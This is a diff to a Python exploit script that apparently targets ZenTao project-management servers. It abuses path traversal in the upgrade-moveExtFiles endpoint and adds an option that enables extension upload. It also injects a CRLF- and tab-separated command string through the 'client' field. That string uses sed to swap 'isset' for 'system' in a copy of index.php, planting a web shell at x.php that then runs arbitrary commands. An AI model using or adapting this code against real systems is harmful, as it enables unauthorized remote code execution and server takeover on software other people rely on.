@@ -13,7 +13,14 @@ parser = argparse.ArgumentParser()
 parser.add_argument('-t', type=str, help="Target url.", default="")
 parser.add_argument('-c', type=str, help="Cookie.", default="")
 parser.add_argument('-a', type=bool, help="Execute command mode.", default=False)
+parser.add_argument('-e', type=bool, help="Extension upload function.", default=False)
 args = parser.parse_args()
+
+
+proxy = {
+    'http': 'http://127.0.0.1:8080/',
+    'https': 'https://127.0.0.1:8080/'
+}
 
 
 def gen_header(target, cookie):
@@ -52,13 +59,13 @@ def getStatusFileName(target, cookie):
         'password': 'dGVzdAo=',
         'serviceProject': 'test'
     }
-    response = requests.post(url=api_url, headers=headers, verify=False, data=data)
+    response = requests.post(url=api_url, headers=headers, verify=False, data=data, proxies=proxy)
     try:
         r = re.search(r"(version_[0-9a-z]+.log)", response.text)
         filename = r.group(1)
         print(Fore.GREEN + "[*] Get status file name successed: {filename}".format(filename=filename))
         return filename
-    except:
+    except Exception as e:
         print(Fore.RED + "[-] Get status file name failed.")
         sys.exit()
 
@@ -70,8 +77,48 @@ def createStatusFile(target, cookie, filename):
     data = {
         'files[0]': f'../../tmp/log/{filename}/test'
     }
-    requests.post(url=api_url, headers=headers, verify=False, data=data)
-    print(Fore.GREEN + "[*] Create status file finished.")
+    try:
+        res = requests.post(url=api_url, headers=headers, verify=False, data=data, proxies=proxy)
+    except:
+        print(Fore.RED + '[-] Connection to target failed!')
+    else:
+        if '/zentao/user-deny-upgrade-moveextfiles.html' in res.text:
+            print(Fore.RED + '[-] Insufficient user rights, failed to create status file!')
+        else:
+            print(Fore.GREEN + "[*] Create status file finished.")
+
+
+def createExtensionFile(target, cookie):
+    print(Fore.WHITE + f"[+] Try to create ok.txt......")
+    api_url = f'{target}/upgrade-moveExtFiles-1'
+    headers = gen_header(target=target, cookie=cookie)
+    data = {
+        'files[0]': f'../../www/data/ok.txt'
+    }
+    try:
+        res = requests.post(url=api_url, headers=headers, verify=False, data=data, proxies=proxy)
+    except:
+        print(Fore.RED + '[-] Connection to target failed!')
+    else:
+        if '/zentao/user-deny-upgrade-moveextfiles.html' in res.text:
+            print(Fore.RED + '[-] Insufficient user rights, failed to create ok.txt file!')
+        else:
+            print(Fore.GREEN + "[*] Create ok.txt file finished.")
+
+
+def check_extension_status(target, cookie):
+    print(Fore.WHITE + '[+] Checking ok.txt creation status......')
+    api_url = f'{target}/extension-browse.html'
+    headers = gen_header(target=target, cookie=cookie)
+    try:
+        res = requests.get(url=api_url, headers=headers, verify=False, timeout=10)
+    except Exception as e:
+        print(Fore.RED + '[-] Connection to target failed!')
+    else:
+        if '/zentao/extension-upload.html' in res.text:
+            print(Fore.GREEN + '[*] Extension upload function is enabled successfully!')
+        else:
+            print(Fore.RED + '[-] Extension upload function is enabled failed!')
 
 
 def useLimitExecWriteShell(target, cookie):
@@ -88,11 +135,14 @@ def useLimitExecWriteShell(target, cookie):
         'serviceProject': 'test',
         'client': "cp\t../../../htdocs/index.php\t../../www/y.php\t--context=\r\nsed\t-i\t's/isset/system/g'\t../../www/y.php\t--in-place=\r\nmv\t../../www/x.php\t../../www/x.php.bak\t--suffix=\r\nmv\t../../www/y.php\t../../www/x.php\t--suffix=\r\n",
     }
-    requests.post(url=api_url, headers=headers, verify=False, data=data)
+    try:
+        requests.post(url=api_url, headers=headers, verify=False, data=data, proxies=proxy)
+    except:
+        print(Fore.RED + '[-] Connection to target failed!')
 
 
 def execShell(target, cmd):
-    response = requests.get(f"{target}/x.php?mode={cmd}")
+    response = requests.get(f"{target}/x.php?mode={cmd}", proxies=proxy)
     commandreslines = []
     for line in response.text.split('\n'):
         if line.startswith('<html xmlns='):
@@ -123,6 +173,9 @@ def run():
                 else:
                     print(Fore.WHITE + f'{execShell(target=target, cmd=cmd)}')
         else:
+            if args.e:
+                createExtensionFile(target=target, cookie=args.c)
+                check_extension_status(target=target, cookie=args.c)
             if not checkShellExists(target=target):
                 status_filename = getStatusFileName(target=target, cookie=args.c)
                 createStatusFile(target=target, cookie=args.c, filename=status_filename)
